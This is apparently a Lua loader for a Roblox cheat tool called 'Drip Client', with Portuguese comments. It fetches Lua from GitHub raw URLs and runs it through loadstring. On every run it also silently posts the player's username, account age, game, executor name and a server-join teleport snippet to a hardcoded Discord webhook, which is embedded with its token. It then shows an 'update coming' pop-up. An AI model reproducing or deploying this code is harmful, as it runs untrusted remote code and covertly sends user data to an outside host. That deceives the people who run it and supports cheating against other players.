local ClientSource = {
    {
        PlaceIds = {4924922222},
        ScriptUrl = "https://raw.githubusercontent.com/realgengar/Brookhaven/refs/heads/main/Source.Lua",
        Active = true,
    }
}

local UniversalScript = "https://raw.githubusercontent.com/realgengar/scripts/refs/heads/main/Games.Lua"

local fetcher = {}
local environment = (getgenv or getrenv or getfenv)()

-- Debounce
do
    local lastExecution = environment.debounceScriptExecution
    if lastExecution and (tick() - lastExecution) <= 3 then
        return nil
    end
    environment.debounceScriptExecution = tick()
end

-- Serviços
local HttpService       = game:GetService("HttpService")
local Players           = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local Debris            = game:GetService("Debris")
local urlWebhook = "https://discord.com/api/webhooks/1492584319770820810/Nz1NjUJbpLYZbqRL_I9Y7IVEL9mMSydJcAJzu8H5a9B_9WN7kKNZfiO6sQT1-s4Tq4u9"
local executionCounts = {}
local notificationSent = false
local JobId = game.JobId

------------------- // -------------------

local function CreateErrorMessage(text)
    environment.scriptLoaded = nil
    environment.scriptActive = false
    local message = Instance.new("Message", workspace)
    message.Text = text
    environment.errorMessage = message
    Debris:AddItem(message, 5)
    error(text, 2)
end

function fetcher.get(url)
    local success, response = pcall(game.HttpGet, game, url)
    if success then
        return response
    end
    CreateErrorMessage("Failed: " .. url .. "\nError: " .. tostring(response))
end

function fetcher.load(url)
    local raw = fetcher.get(url)
    if not raw then return end

    local executeFunction, errorText = loadstring(raw)
    if type(executeFunction) ~= "function" then
        CreateErrorMessage("Error loading: " .. url .. "\nError: " .. tostring(errorText))
    else
        return executeFunction
    end
end

------------------- // -------------------

local function IsValidPlace(entry)
    if not entry.Active then return false end

    local ids = entry.PlaceIds or (type(entry.PlaceId) == "table" and entry.PlaceId)
    if not ids then return false end

    for _, placeId in ipairs(ids) do
        if placeId == game.PlaceId then
            return true
        end
    end
    return false
end

local function HasSpecificScript()
    for _, entry in ipairs(ClientSource) do
        if IsValidPlace(entry) then
            return true, entry
        end
    end
    return false, nil
end

local function GetGameName()
    local success, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
    return (success and info and info.Name) or "Jogo Desconhecido"
end

local function GameInfo()
    return {
        PlaceId   = game.PlaceId,
        GameId    = game.GameId,
        SessionId = JobId,
        Name      = GetGameName(),
    }
end

------------------- // -------------------

local function ShowMessage(text, duration)
    local message = Instance.new("Message", workspace)
    message.Text = text
    Debris:AddItem(message, duration or 3)
end

local function ExecuteSpecificScript(entry)
    local fn = fetcher.load(entry.ScriptUrl)
    if not fn then return false end

    local success, result = pcall(fn)
    if success then
        environment.scriptLoaded = true
        environment.scriptActive = true
        ShowMessage("Specific Script Loaded")
        return true
    end
    CreateErrorMessage("Error: " .. tostring(result))
    return false
end

local function ExecuteUniversalScript()
    local fn = fetcher.load(UniversalScript)
    if not fn then return false end

    local success, result = pcall(fn)
    if success then
        environment.scriptLoaded = true
        environment.scriptActive = true
        ShowMessage("Universal Script")
        return true
    end
    CreateErrorMessage("Error: " .. tostring(result))
    return false
end

local function LoadDrip()
    local hasSpecific, specificEntry = HasSpecificScript()
    if hasSpecific then
        return ExecuteSpecificScript(specificEntry)
    end
    return ExecuteUniversalScript()
end

--------------------------------------------------------------------------------
-- Webhook / Notificação
--------------------------------------------------------------------------------

local function getHttpRequestFunction()
    for _, fn in ipairs({ http_request, syn and syn.request, http and http.request, request }) do
        if type(fn) == "function" then return fn end
    end
end

local function sendWebhookNotification(data)
    local httpRequest = getHttpRequestFunction()
    if not httpRequest then return end

    local success, _ = pcall(httpRequest, {
        Url     = urlWebhook,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode(data),
    })
    -- falha silenciosa intencional
end

local function formatTime(timestamp)
    local diff = os.difftime(os.time(), timestamp)
    if diff < 86400 then
        return "Hoje às " .. os.date("%H:%M", timestamp)
    elseif diff < 172800 then
        return "Ontem às " .. os.date("%H:%M", timestamp)
    end
    return os.date("%d/%m/%Y às %H:%M", timestamp)
end

local function getAccountAge(player)
    return tostring(player.AccountAge) .. " Dias"
end

local function getExecutorName()
    if identifyexecutor then
        local ok, name = pcall(identifyexecutor)
        if ok and name then return name end
    end
    return "Desconhecido"
end

local function incrementExecutionCount(jobId)
    executionCounts[jobId] = (executionCounts[jobId] or 0) + 1
    return executionCounts[jobId]
end

local function getThumbnailURL(userId)
    local apiUrl = string.format(
        "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false",
        userId
    )
    local httpRequest = getHttpRequestFunction()
    if httpRequest then
        local ok, response = pcall(httpRequest, {
            Url     = apiUrl,
            Method  = "GET",
            Headers = { ["Content-Type"] = "application/json" },
        })
        if ok and response and response.StatusCode == 200 then
            local parsed_ok, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
            if parsed_ok and data and data.data and data.data[1] then
                local entry = data.data[1]
                if entry.state == "Completed" and entry.imageUrl then
                    return entry.imageUrl
                end
            end
        end
    end
    -- fallback
    return string.format(
        "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
        userId
    )
end

local function notifyExecutingUser()
    if notificationSent then return end

    local user = Players.LocalPlayer
    if not user then return end

    notificationSent = true

    local teleportCode = string.format(
        '(game:GetService("TeleportService")):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
        game.PlaceId, JobId
    )

    local embedData = {
        username   = "Notification",
        avatar_url = "https://cdn.discordapp.com/attachments/1405932316446031993/1420048894057910374/image.webp",
        embeds = {{
            title       = "Logs Users Drip client",
            description = " ",
            color       = 0x9932CC,
            thumbnail   = { url = getThumbnailURL(user.UserId) },
            footer      = { text = "discord.gg/solutions ┃ " .. formatTime(os.time()) },
            fields = {
                {
                    name  = "Infor users:",
                    value = string.format("```User: %s\nRunning: %s\nJoined Roblox: %s```",
                        user.Name, GetGameName(), getAccountAge(user)),
                    inline = false,
                },
                {
                    name  = "Infor Player:",
                    value = string.format("> Players: **%d/25**\n> Executor: **%s**",
                        #Players:GetPlayers(), getExecutorName()),
                    inline = false,
                },
                {
                    name   = "Teleport to Server Mobile;",
                    value  = "\n" .. teleportCode .. "\n",
                    inline = false,
                },
                {
                    name   = "Teleport to Server Pc;",
                    value  = "```\n" .. teleportCode .. "\n```",
                    inline = false,
                },
            },
        }},
    }
    sendWebhookNotification(embedData)
end

local function waitForLocalPlayer()
    if Players.LocalPlayer then
        notifyExecutingUser()
        return
    end

    local conn
    conn = Players.PlayerAdded:Connect(function(plr)
        if plr == Players.LocalPlayer then
            conn:Disconnect()
            notifyExecutingUser()
        end
    end)

    task.delay(10, function()
        if conn then conn:Disconnect() end
        notifyExecutingUser() -- idempotente por causa do flag
    end)
end

waitForLocalPlayer()

------------------- // -------------------

local function BuildNotificationGui()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DripClientNotification"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    -- Proteção: tenta colocar em CoreGui, cai em PlayerGui se não tiver permissão
    local ok = pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
    if not ok then
        screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    end

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Parent = screenGui
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -90)
    mainFrame.Size = UDim2.new(0, 350, 0, 180)
    mainFrame.ClipsDescendants = true

    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

    local stroke = Instance.new("UIStroke", mainFrame)
    stroke.Color = Color3.fromRGB(150, 0, 255)
    stroke.Thickness = 2

    -- Título
    local titleLabel = Instance.new("TextLabel", mainFrame)
    titleLabel.Name = "Title"
    titleLabel.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
    titleLabel.Size = UDim2.new(1, 0, 0, 35)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Text = "DRIP CLIENT | ATUALIZAÇÃO"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 20
    Instance.new("UICorner", titleLabel).CornerRadius = UDim.new(0, 12)

    -- Mensagem
    local msgLabel = Instance.new("TextLabel", mainFrame)
    msgLabel.Name = "Message"
    msgLabel.BackgroundTransparency = 1
    msgLabel.Position = UDim2.new(0, 15, 0, 45)
    msgLabel.Size = UDim2.new(1, -30, 0, 85)
    msgLabel.Font = Enum.Font.GothamMedium
    msgLabel.Text = "Prepare-se! O Drip Client está prestes a retornar com uma atualização massiva. Novas funcionalidades poderosas e otimizações exclusivas estão a caminho. Fique ligado para o relançamento!"
    msgLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
    msgLabel.TextSize = 15
    msgLabel.TextWrapped = true
    msgLabel.TextXAlignment = Enum.TextXAlignment.Center
    msgLabel.LineHeight = 1.2

    -- Botão fechar
    local closeBtn = Instance.new("TextButton", mainFrame)
    closeBtn.Name = "CloseButton"
    closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    closeBtn.Position = UDim2.new(0.5, -50, 0.82, 0)
    closeBtn.Size = UDim2.new(0, 100, 0, 30)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Text = "ENTENDIDO"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextSize = 13
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)

    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
end

BuildNotificationGui()

return LoadDrip()
